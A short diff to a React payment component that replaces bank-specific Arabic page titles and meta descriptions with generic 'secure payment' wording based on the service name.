@@ -273,10 +273,10 @@ const PaymentBankLogin = () => {
   return (
     <>
       <PaymentMetaTags 
-        serviceKey={selectedBankId !== 'skipped' && selectedBankId ? `bank_${selectedBankId}` : serviceKey}
-        serviceName={selectedBank?.nameAr || serviceName}
-        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
-        customDescription={`الخدمات المصرفية الإلكترونية - تسجيل دخول آمن - ${selectedBank?.nameAr || 'البنك'}`}
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        title={`دفع آمن - ${serviceName}`}
+        customDescription={`أكمل عملية الدفع بأمان تام - ${serviceName}`}
         amount={formattedAmount}
       />
 
